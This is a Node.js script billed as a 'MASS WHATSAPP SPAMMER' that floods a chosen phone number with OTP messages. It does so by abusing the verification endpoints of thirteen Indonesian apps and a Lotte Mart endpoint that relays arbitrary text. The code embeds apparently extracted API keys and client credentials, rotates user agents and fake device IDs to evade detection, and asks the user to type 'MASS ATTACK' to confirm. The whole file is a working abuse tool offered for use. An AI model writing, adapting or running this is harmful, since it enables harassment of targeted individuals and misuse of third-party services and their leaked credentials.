const axios = require('axios');
const crypto = require('crypto');
const readline = require('readline');

function getRandomUserAgent() {
    const agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
    ];
    return agents[Math.floor(Math.random() * agents.length)];
}

function generateRandom(length, type = 'hex') {
    if (type === 'numeric') {
        let result = '';
        for (let i = 0; i < length; i++) {
            result += Math.floor(Math.random() * 10);
        }
        return result;
    } else if (type === 'alphanumeric') {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    } else {
        return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
    }
}

class WhatsAppSpammer {
    constructor() {
        this.results = [];
        this.callback = null;
        this.attackCount = 0;
        this.maxLoops = 10;
    }
    
    setCallback(callback) {
        this.callback = callback;
    }
    
    setMaxLoops(loops) {
        this.maxLoops = loops;
    }
    
    async startSpam(phoneNumber, mode = 'whatsapp', message = '') {
        console.log(`[🚀] Starting MASS spam attack on: ${phoneNumber}`);
        console.log(`[🎯] Mode: ${mode}, Loops: ${this.maxLoops}, Message: ${message || 'default'}\n`);
        
        const totalApis = 13; // API yang masih aktif
        const totalRequests = totalApis * this.maxLoops;
        console.log(`[📊] Estimated total requests: ${totalRequests}`);
        
        for (let loop = 1; loop <= this.maxLoops; loop++) {
            console.log(`\n[🔄] LOOP ${loop}/${this.maxLoops}`);
            
            if (mode === 'whatsapp') {
                await this.spamWhatsApp(phoneNumber, loop);
            } else if (mode === 'message') {
                await this.spamMessage(phoneNumber, message);
            }
            
            if (loop < this.maxLoops) {
                const delayTime = 3000 + Math.random() * 2000;
                console.log(`[⏳] Waiting ${Math.round(delayTime/1000)}s before next loop...`);
                await this.delay(delayTime);
            }
        }
        
        console.log(`\n[🎉] MASS ATTACK COMPLETED!`);
        console.log(`[📊] Total loops: ${this.maxLoops}`);
        console.log(`[📊] Total attempts: ${this.results.length}`);
        console.log(`[✅] Success: ${this.results.filter(r => r.success).length}`);
        console.log(`[❌] Failed: ${this.results.filter(r => !r.success).length}`);
        
        return this.results;
    }
    
    async spamWhatsApp(phoneNumber, currentLoop) {
        const phoneNumber2 = phoneNumber.startsWith('0') ? phoneNumber.substring(1) : phoneNumber;
        
        const activeApis = [
            () => this.callCANDIRELOAD(phoneNumber, currentLoop),
            () => this.callBISATOPUP(phoneNumber, currentLoop),
            () => this.callSPEEDCASH(phoneNumber, currentLoop),
            () => this.callKERBEL(phoneNumber, currentLoop),
            () => this.callTVVOUCHER(phoneNumber, currentLoop),
            () => this.callJOGJAKITA(phoneNumber, currentLoop),
            () => this.callPULSAPINTAR(phoneNumber, currentLoop),
            () => this.callMITRADELTA(phoneNumber, currentLoop),
            () => this.callYAGAMICELL(phoneNumber, currentLoop),
            () => this.callZ4RELOAD(phoneNumber, currentLoop),
            () => this.callPINJAMDUIT(phoneNumber, currentLoop),
            () => this.callUANGME(phoneNumber, currentLoop),
            () => this.callADIRAKU(phoneNumber, currentLoop)
        ];
        
        const batchSize = 3;
        for (let i = 0; i < activeApis.length; i += batchSize) {
            const batch = activeApis.slice(i, i + batchSize);
            const promises = batch.map(api => api());
            
            try {
                await Promise.allSettled(promises);
            } catch (error) {     
            }
            
            if (i + batchSize < activeApis.length) {
                await this.delay(1000 + Math.random() * 1000);
            }
        }
    }
    
    // ==================== API YANG MASIH AKTIF ====================
    
    async callCANDIRELOAD(phoneNumber, loop) {
        try {
            const response = await axios.post(
                'https://app.candireload.com/apps/v8/users/req_otp_register_wa',
                { uuid: 'b787045b140c631f', phone: phoneNumber },
                {
                    headers: {
                        'Content-Type': 'application/json',
                        'irsauth': 'c6738e934fd7ed1db55322e423d81a66',
                        'User-Agent': getRandomUserAgent()
                    },
                    timeout: 5000
                }
            );
            
            if (response.data.success) {
                this.logSuccess('CANDIRELOAD', phoneNumber, loop);
                return true;
            }
        } catch (error) {
            this.logError('CANDIRELOAD', error.message);
        }
        return false;
    }
    
    async callBISATOPUP(phoneNumber, loop) {
        try {
            const response = await axios.post(
                'https://api-mobile.bisatopup.co.id/register/send-verification',
                `phone_number=${phoneNumber}`,
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': getRandomUserAgent()
                    },
                    params: {
                        type: 'WA',
                        device_id: generateRandom(16, 'hex'),
                        version_name: '6.12.04',
                        version: '61204'
                    },
                    timeout: 5000
                }
            );
            
            if (response.data.message?.includes('OTP akan segera dikirim')) {
                this.logSuccess('BISATOPUP', phoneNumber, loop);
                return true;
            }
        } catch (error) {
            this.logError('BISATOPUP', error.message);
        }
        return false;
    }
    
    async callSPEEDCASH(phoneNumber, loop) {
        try {
            const authResponse = await axios.post(
                'https://sofia.bmsecure.id/central-api/oauth/token',
                'grant_type=client_credentials',
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Authorization': 'Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==',
                        'User-Agent': getRandomUserAgent()
                    },
                    timeout: 5000
                }
            );
            
            const authToken = authResponse.data.access_token;
            
            const otpResponse = await axios.post(
                'https://sofia.bmsecure.id/central-api/sc-api/otp/generate',
                {
                    version_name: '6.2.1 (428)',
                    phone: phoneNumber,
                    appid: 'SPEEDCASH',
                    version_code: 428,
                    location: '0,0',
                    state: 'REGISTER',
                    type: 'WA',
                    app_id: 'SPEEDCASH',
                    uuid: `00000000-4c22-250d-ffff-ffff${generateRandom(8, 'hex')}`,
                    via: 'BB ANDROID'
                },
                {
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${authToken}`,
                        'User-Agent': getRandomUserAgent()
                    },
                    timeout: 5000
                }
            );
            
            if (otpResponse.data.rc === '00') {
                this.logSuccess('SPEEDCASH', phoneNumber, loop);
                return true;
            }
        } catch (error) {
            this.logError('SPEEDCASH', error.message);
        }
        return false;
    }
    
    async callKERBEL(phoneNumber, loop) {
        try {
            const boundary = '--dio-boundary-0879576676';
            const body = `${boundary}\r\n` +
                        'content-disposition: form-data; name="phone"\r\n\r\n' +
                        `${phoneNumber}\r\n` +
                        `${boundary}\r\n` +
                        'content-disposition: form-data; name="otp"\r\n\r\n' +
                        '118872\r\n' +
                        `${boundary}--`;
            
            const response = await axios.post(
                'https://keranjangbelanja.co.id/api/v1/user/otp',
                body,
                {
                    headers: {
                        'Content-Type': `multipart/form-data; boundary=${boundary.substring(2)}`,
                        'User-Agent': getRandomUserAgent()
                    },
                    timeout: 5000
                }
            );
            
            if (response.data.result?.includes('OTP Berhasil Dikirimkan')) {
                this.logSuccess('KERBEL', phoneNumber, loop);
                return true;
            }
        } catch (error) {
            this.logError('KERBEL', error.message);
        }
        return false;
    }
    
    async callTVVOUCHER(phoneNumber, loop) {
        try {
            const response = await axios.post(
                'https://api.tv-voucher.com/tvv/app/general/v2/checkdatawa',
                {
                    countryid: '62',
                    phone: phoneNumber
                },
                {
                    headers: {
                        'Content-Type': 'application/json; charset=UTF-8',
                        'TVV-APIKEY': 'Tvv1c8cb860b53a53451161937dff2fb5b9c2424c06b3b2dda97c02096a7f6c2',
                        'User-Agent': getRandomUserAgent()
                    },
                    timeout: 5000
                }
            );
            
            if (response.data.success) {
                this.logSuccess('TV VOUCHER', phoneNumber, loop);
                return true;
            }
        } catch (error) {
            this.logError('TV VOUCHER', error.message);
        }
        return false;
    }
    
    async callJOGJAKITA(phoneNumber, loop) {
        try {
            const authResponse = await axios.post(
                'https://aci-user.bmsecure.id/oauth/token',
                'grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=501&version_name=6.10.1',
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'authorization': 'Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==',
                        'User-Agent': getRandomUserAgent()
                    },
                    timeout: 5000
                }
            );
            
            const authToken = authResponse.data.access_token;
            
            const otpResponse = await axios.post(
                'https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send',
                {
                    phone_user: phoneNumber,
                    primary_credential: {
                        device_id: '',
                        fcm_token: '',
                        id_kota: 0,
                        id_user: 0,
                        location: '0.0,0.0',
                        uuid: '',
                        version_code: '501',
                        version_name: '6.10.1',
                        via: 'jogjakita_user'
                    },
                    uuid: '00000000-4c22-250d-3006-9a465f072739',
                    version_code: '501',
                    version_name: '6.10.1',
                    via: 'jogjakita_user'
                },
                {
                    headers: {
                        'Content-Type': 'application/json; charset=UTF-8',
                        'Authorization': `Bearer ${authToken}`,
                        'User-Agent': getRandomUserAgent()
                    },
                    timeout: 5000
                }
            );
            
            if (otpResponse.data.rc === 200) {
                this.logSuccess('JOGJAKITA', phoneNumber, loop);
                return true;
            }
        } catch (error) {
            this.logError('JOGJAKITA', error.message);
        }
        return false;
    }
    
    async callPULSAPINTAR(phoneNumber, loop) {
        try {
            const response = await axios.post(
                'https://api.cl2406v3.berkah-ts.my.id/apps/users/registerotp',
                {
                    name: 'AGUS',
                    pin: '111111',
                    phone: phoneNumber,
                    kodereferal: null,
                    kota: 'Banda Aceh',
                    email: `AGUS${generateRandom(5, 'numeric')}@gmail.com`,
                    otpType: 'wa',
                    uuid: 'b787045b140c631f'
                },
                {
                    headers: {
                        'Content-Type': 'application/json',
                        'irsauth': 'f567ce1acd17b852dae4d975aedb16fe',
                        'User-Agent': getRandomUserAgent()
                    },
                    timeout: 5000
                }
            );
            
            if (response.data.success) {
                this.logSuccess('PULSAPINTAR', phoneNumber, loop);
                return true;
            }
        } catch (error) {
            this.logError('PULSAPINTAR', error.message);
        }
        return false;
    }
    
    async callMITRADELTA(phoneNumber, loop) {
        try {
            const response = await axios.get(
                `https://irsx.mitradeltapulsa.com:8080/appirsx/appapi.dll/otpreg?phone=${phoneNumber}`,
                {
                    headers: {
                        'aid': `gaid_15497a9b-2669-42cf-ad10-${generateRandom(12, 'hex')}`,
                        'android_id': 'b787045b140c631f',
                        'app_version': '300504',
                        'brand': 'samsung',
                        'carrier': '00',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'country': '510',
                        'dfp': '6F95F26E1EEBEC8A1FE4BE741D826AB0',
                        'fcm_reg_id': 'frHvK61jS-ekpp6SIG46da:APA91bEzq2XwRVb6Nth9hEsgpH8JGDxynt5LyYEoDthLGHL-kC4_fQYEx0wZqkFxKvHFA1gfRVSZpIDGBDP763E8AhgRjDV7kKjnL-Mi4zH2QDJlsrzuMRo',
                        'gaid': 'gaid_15497a9b-2669-42cf-ad10-d0d0d8f50ad0',
                        'lan': 'in_ID',
                        'model': 'SM-G965N',
                        'ns': 'wifi',
                        'os': '1',
                        'timestamp': Math.floor(Date.now() / 1000).toString(),
                        'tz': 'Asia%2FBangkok',
                        'User-Agent': getRandomUserAgent(),
                        'v': '1',
                        'version': '28'
                    },
                    timeout: 5000
                }
            );
            
            if (response.data.success) {
                this.logSuccess('MITRADELTA', phoneNumber, loop);
                return true;
            }
        } catch (error) {
            this.logError('MITRADELTA', error.message);
        }
        return false;
    }
    
    async callYAGAMICELL(phoneNumber, loop) {
        try {
            const response = await axios.post(
                'https://yagami-cell.com/api/main/register_awal_v2',
                `phone=${phoneNumber}&email=`,
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'User-Agent': getRandomUserAgent()
                    },
                    timeout: 5000
                }
            );
            
            if (response.data.success) {
                this.logSuccess('YAGAMICELL', phoneNumber, loop);
                return true;
            }
        } catch (error) {
            this.logError('YAGAMICELL', error.message);
        }
        return false;
    }
    
    async callZ4RELOAD(phoneNumber, loop) {
        try {
            const response = await axios.post(
                'https://api.irmastore.id/apps/otp/v2/sendotpwa',
                {
                    hp: phoneNumber,
                    uuid: 'MyT2H1xFo2WHoMT5gjdo3W9woys1',
                    app_code: 'z4reload'
                },
                {
                    headers: {
                        'Content-Type': 'application/json',
                        'authorization': '7117c8f459a98282c2c576b519d0662f',
                        'User-Agent': getRandomUserAgent()
                    },
                    timeout: 5000
                }
            );
            
            if (response.data.success) {
                this.logSuccess('Z4RELOAD', phoneNumber, loop);
                return true;
            }
        } catch (error) {
            this.logError('Z4RELOAD', error.message);
        }
        return false;
    }
    
    async callPINJAMDUIT(phoneNumber, loop) {
        try {
            const response = await axios.post(
                'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code',
                `phone=${phoneNumber}&sms_useage=0&sms_service=2&from=0&clientType=a&appVersion=5.7.3&deviceId=${generateRandom(36, 'hex')}&hardwareid=${generateRandom(36, 'hex')}&mobilePhone=&deviceName=SM-G965N&osVersion=9&appName=PinjamDuit&appMarket=google_play`,
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': getRandomUserAgent()
                    },
                    timeout: 5000
                }
            );
            
            if (response.data.code === '0') {
                this.logSuccess('PINJAMDUIT', phoneNumber, loop);
                return true;
            }
        } catch (error) {
            this.logError('PINJAMDUIT', error.message);
        }
        return false;
    }
    
    async callUANGME(phoneNumber, loop) {
        try {
            const response = await axios.get(
                `https://api.uangme.com/api/v2/sms_code?phone=${phoneNumber}&scene_type=login&send_type=wp`,
                {
                    headers: {
                        'User-Agent': getRandomUserAgent()
                    },
                    timeout: 5000
                }
            );
            
            if (response.data.code === '200' || response.data.success) {
                this.logSuccess('UANGME', phoneNumber, loop);
                return true;
            }
        } catch (error) {
            this.logError('UANGME', error.message);
        }
        return false;
    }
    
    async callADIRAKU(phoneNumber, loop) {
        try {
            const response = await axios.post(
                'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
                {
                    mobileNumber: phoneNumber,
                    type: 'prospect-create',
                    channel: 'whatsapp'
                },
                {
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': getRandomUserAgent()
                    },
                    timeout: 5000
                }
            );
            
            if (response.data.message?.includes('success') || response.data.success) {
                this.logSuccess('ADIRAKU', phoneNumber, loop);
                return true;
            }
        } catch (error) {
            this.logError('ADIRAKU', error.message);
        }
        return false;
    }
    
    async spamMessage(phoneNumber, message) {
        try {
            const phoneNumber2 = phoneNumber.startsWith('0') ? phoneNumber.substring(1) : phoneNumber;
            
            const response = await axios.post(
                'https://lottemartpoint.lottemart.co.id/api5/send_otp',
                {
                    cellno: `62${phoneNumber2}`,
                    text: message
                },
                {
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${generateRandom(40, 'hex')}`,
                        'User-Agent': getRandomUserAgent()
                    },
                    timeout: 5000
                }
            );
            
            if (response.data.success || response.data.status?.includes('success')) {
                this.logSuccess('MESSAGE', phoneNumber, message);
                return true;
            }
        } catch (error) {
            this.logError('MESSAGE', error.message);
        }
        return false;
    }
    
    logSuccess(apiName, phoneNumber, loop = 1) {
        const result = {
            api: apiName,
            success: true,
            phone: phoneNumber,
            loop: loop,
            timestamp: new Date().toISOString()
        };
        
        this.results.push(result);
        console.log(`[✅] LOOP ${loop} - ${apiName}: Success to ${phoneNumber}`);
        
        if (this.callback) {
            this.callback.onSpamResult(`Spam success via ${apiName} (Loop ${loop})`);
        }
    }
    
    logError(apiName, errorMessage) {
        const result = {
            api: apiName,
            success: false,
            error: errorMessage,
            timestamp: new Date().toISOString()
        };
        
        this.results.push(result);
        if (!errorMessage.includes('timeout') && !errorMessage.includes('ECONNREFUSED')) {
            console.log(`[⚠️] ${apiName}: ${errorMessage.substring(0, 50)}...`);
        }
        
        if (this.callback) {
            this.callback.onSpamError(`${apiName} Error`);
        }
    }
    
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

class SpamCallback {
    onSpamResult(result) {
        // Optional: Simpan ke file atau kirim notifikasi
    }
    
    onSpamError(error) {
        // Optional: Handle error
    }
}

async function main() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    
    console.log(`
    ╔══════════════════════════════════════╗
    ║   MASS WHATSAPP SPAMMER v2.0         ║
    ║   Optimized + Loop System            ║
    ╚══════════════════════════════════════╝
    `);
    
    const phoneNumber = await new Promise(resolve => {
        rl.question('[?] Enter phone number (08xxx): ', resolve);
    });
    
    const mode = await new Promise(resolve => {
        rl.question('[?] Mode (whatsapp/message): ', resolve);
    });
    
    let message = '';
    if (mode === 'message') {
        message = await new Promise(resolve => {
            rl.question('[?] Enter message: ', resolve);
        });
    }
    
    const loopInput = await new Promise(resolve => {
        rl.question('[?] Number of loops (1-100, default 10): ', resolve);
    });
    
    const loops = loopInput ? parseInt(loopInput) : 10;
    const maxLoops = Math.min(Math.max(loops, 1), 100);
    
    console.log(`\n[⚠️] Target: ${phoneNumber}`);
    console.log(`[⚠️] Mode: ${mode}`);
    console.log(`[⚠️] Loops: ${maxLoops}`);
    console.log(`[⚠️] Estimated requests: ${13 * maxLoops}`);
    console.log(`[⚠️] Estimated duration: ${Math.round(maxLoops * 20)} seconds`);
    
    const confirm = await new Promise(resolve => {
        rl.question('[?] Type "MASS ATTACK" to confirm: ', resolve);
    });
    
    if (confirm.toUpperCase() !== 'MASS ATTACK') {
        console.log('[❌] Cancelled.');
        rl.close();
        return;
    }
    
    console.log(`\n[🔥] STARTING MASS ATTACK IN 3 SECONDS...`);
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    const spammer = new WhatsAppSpammer();
    spammer.setCallback(new SpamCallback());
    spammer.setMaxLoops(maxLoops);
    
    const startTime = Date.now();
    await spammer.startSpam(phoneNumber, mode, message);
    const endTime = Date.now();
    
    const duration = (endTime - startTime) / 1000;
    console.log(`\n[⏱️] Total duration: ${duration.toFixed(1)} seconds`);
    console.log(`[📈] Requests per second: ${(spammer.results.length / duration).toFixed(2)}`);
    
    rl.close();
}

// Run if called directly
if (require.main === module) {
    main().catch(console.error);
}

module.exports = { WhatsAppSpammer, SpamCallback };